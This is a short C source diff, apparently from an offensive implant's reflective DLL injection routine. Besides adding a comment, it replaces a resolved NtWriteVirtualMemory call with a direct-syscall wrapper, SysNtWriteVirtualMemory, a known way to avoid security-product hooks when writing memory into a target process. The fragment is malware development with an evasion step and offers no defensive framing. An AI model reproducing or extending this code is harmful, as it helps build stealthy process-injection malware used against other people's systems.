@@ -149,6 +149,7 @@ END:
         Process = NULL;
     }
 
+    /* close thread handle */
     if ( Thread ) {
         SysNtClose( Thread );
         Thread = NULL;
@@ -227,7 +228,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
-            NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
+            NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
